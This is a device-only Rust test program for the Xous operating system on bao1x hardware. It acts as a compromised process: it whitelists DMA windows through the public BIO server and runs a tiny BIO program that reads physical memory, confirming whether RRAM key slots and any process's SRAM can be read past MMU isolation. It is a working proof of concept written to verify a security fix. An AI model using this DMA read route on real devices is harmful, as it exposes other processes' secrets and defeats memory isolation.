//! TEST ONLY, never in a release image. Plays a compromised process that uses only public
//! APIs: the BIO server in bao1x-hal-service (open to every process) and the keystore.
//!
//! It asks the BIO server to whitelist a memory range for BIO DMA, loads a four-instruction
//! BIO program that loads a word from an address it is given and returns it, and checks
//! whether that reads memory the MMU should keep it from:
//!
//! 1. app slot 170 in RRAM: a fresh canary written through the keystore first. App slots are
//!    `PartitionAccess::Open`, so the RRAM controller doesn't check the reader (rrc.sv: the
//!    check needs a non-zero owner), and the keystore isn't involved at all.
//! 2. a page of this process's own SRAM, by physical address: the same route reaches any
//!    process's memory.
//!
//! It never touches the signer's slots (160..162) and logs only whether each word matched.
//! Results repeat on the USB serial console, so build the image with GENERIC_HID=0.

#[cfg(target_os = "xous")]
fn main() -> ! {
    use std::num::NonZeroU32;
    use std::time::{Duration, Instant};

    use bao1x_api::bio::*;
    use bao1x_api::bio_resources::*;
    use bao1x_api::bio_code;
    use bao1x_hal::bio::{Bio, CoreCsr};
    use keystore_api::{APPKEY_GUARD, AppKey};
    use utralib::utra::bio_bdma;

    const SLOT: usize = 170;
    const DATA_SLOT_START: u32 = 0x603E_0000;
    const APPLICATION_BASE: u32 = 384;
    const SLOT_ADDR: u32 = DATA_SLOT_START + (APPLICATION_BASE + SLOT as u32) * 32;

    log_server::init_wait().unwrap();
    log::set_max_level(log::LevelFilter::Info);
    usb_bao1x::UsbHid::new().serial_console_input_injection();
    std::thread::sleep(Duration::from_secs(12));

    let mut lines: Vec<String> = Vec::new();
    let mut note = |l: String| {
        log::info!("{l}");
        lines.push(l);
    };

    let rand_words = || -> [u32; 8] {
        let a = xous::create_server_id().unwrap().to_array();
        let b = xous::create_server_id().unwrap().to_array();
        [a[0], a[1], a[2], a[3], b[0], b[1], b[2], b[3]]
    };

    let xns = xous_names::XousNames::new().unwrap();
    let ks = xns.request_connection_blocking(keystore_api::SERVER_NAME_KEYS).expect("keystore");
    let call = |op: AppKey| -> AppKey {
        let Ok(mut buf) = xous_ipc::Buffer::into_buf(op) else { return AppKey::InternalError };
        if buf.lend_mut(ks, keystore_api::Opcode::AppKeyOp as u32).is_err() {
            return AppKey::InternalError;
        }
        buf.to_original::<AppKey, _>().unwrap_or(AppKey::InternalError)
    };
    let canary = rand_words();
    let mut data = [0u8; 32];
    for (i, w) in canary.iter().enumerate() {
        data[i * 4..i * 4 + 4].copy_from_slice(&w.to_le_bytes());
    }
    let wrote = call(AppKey::Write { guard: APPKEY_GUARD, index: SLOT, data });
    let back = matches!(call(AppKey::ReadRequest { guard: APPKEY_GUARD, index: SLOT }),
        AppKey::ReadResponse { data: d, .. } if d == data);
    note(format!("PROBE setup: canary written to app slot {SLOT} at {SLOT_ADDR:#x}: {wrote:?}, read back through the keystore: {back}"));

    let mut page = xous::map_memory(None, None, 4096, xous::MemoryFlags::R | xous::MemoryFlags::W).unwrap();
    let ram_canary = rand_words();
    let ram: &mut [u32] = unsafe { page.as_slice_mut() };
    ram[..8].copy_from_slice(&ram_canary);
    let ram_phys = xous::syscall::virt_to_phys(page.as_ptr() as usize).unwrap() as u32;
    note(format!("PROBE setup: SRAM canary in own page, physical {ram_phys:#x}"));

    let mut bio = Bio::new();
    let spec = ResourceSpec {
        claimer: "bio-dma-probe".to_string(),
        cores: vec![CoreRequirement::Any],
        fifos: vec![Fifo::Fifo0, Fifo::Fifo1],
        static_pins: vec![],
        dynamic_pin_count: 0,
    };
    let grant = bio.claim_resources(&spec).expect("BIO resources");
    let core = grant.cores[0];
    bio.init_core(core, peek_code(), CoreConfig { clock_mode: ClockMode::FixedDivider(0, 0) })
        .expect("BIO init_core");
    let windows = DmaFilterWindows {
        windows: [
            Some(DmaWindow { base: SLOT_ADDR >> 12, bounds: NonZeroU32::new(1).unwrap() }),
            Some(DmaWindow { base: ram_phys >> 12, bounds: NonZeroU32::new(1).unwrap() }),
            None,
            None,
        ],
    };
    let asked = format!("{:?}", bio.setup_dma_windows(windows));
    note(format!("PROBE asked the BIO server for DMA windows over the slot page and the SRAM page: {asked}"));
    bio.set_core_run_state(&grant, true);
    // addresses go in on FIFO 0, words come back on FIFO 1 (one FIFO is a single queue, so
    // using it both ways makes the core read its own output back as the next address)
    let handle = unsafe { bio.get_core_handle(Fifo::Fifo0) }.expect("handle").expect("FIFO0 handle");
    let handle1 = unsafe { bio.get_core_handle(Fifo::Fifo1) }.expect("handle").expect("FIFO1 handle");
    let mut csr = CoreCsr::from_handle(&handle).csr;
    let csr1 = CoreCsr::from_handle(&handle1).csr;

    let mut peek = |addr: u32| -> Option<u32> {
        csr.wo(bio_bdma::SFR_TXF0, addr);
        let t = Instant::now();
        while csr1.rf(bio_bdma::SFR_FLEVEL_PCLK_REGFIFO_LEVEL1) == 0 {
            if t.elapsed() > Duration::from_millis(200) {
                return None;
            }
        }
        Some(csr1.r(bio_bdma::SFR_RXF1))
    };
    let mut raw = Vec::new();
    for a in [0x6000_0000u32, 0x6000_0004, 0x6000_0008, 0x6000_000c] {
        raw.push(peek(a));
    }
    note(format!("PROBE control, public boot0 code at 0x60000000, no window: {raw:08x?}"));
    let mut check = |name: &str, base: u32, want: &[u32; 8], lines: &mut dyn FnMut(String)| -> bool {
        let mut matched = 0;
        let mut answered = 0;
        let mut got = Vec::new();
        for (i, w) in want.iter().enumerate() {
            match peek(base + 4 * i as u32) {
                Some(v) => {
                    answered += 1;
                    matched += (v == *w) as usize;
                    got.push(v);
                }
                None => break,
            }
        }
        let read = matched == 8;
        lines(format!(
            "PROBE {name}: {answered}/8 words returned, {matched}/8 match the canary -> {} (got {:08x?}, canary starts {:08x} {:08x})",
            if read { "READ THROUGH BIO DMA" } else { "not read" }, &got[..got.len().min(4)], want[0], want[1]
        ));
        read
    };
    let slot_read = check("RRAM app slot", SLOT_ADDR, &canary, &mut note);
    let ram_read = check("own SRAM page by physical address", ram_phys, &ram_canary, &mut note);
    note(format!(
        "PROBE summary: RRAM slot {} / SRAM {} (before the fix both should be read; after it, neither)",
        if slot_read { "READ" } else { "blocked" },
        if ram_read { "READ" } else { "blocked" }
    ));
    let _ = (&handle, &handle1);
    loop {
        for l in &lines {
            log::info!("{l}");
        }
        std::thread::sleep(Duration::from_secs(5));
    }
}

#[cfg(target_os = "xous")]
#[rustfmt::skip]
bao1x_api::bio_code!(peek_code, PEEK_START, PEEK_END,
  "20:",
    "mv a3, x16",
    "lw t0, 0(a3)",
    "mv x17, t0",
    "j 20b"
);

#[cfg(not(target_os = "xous"))]
fn main() {
    eprintln!("bio-dma-probe is a device-only test");
}
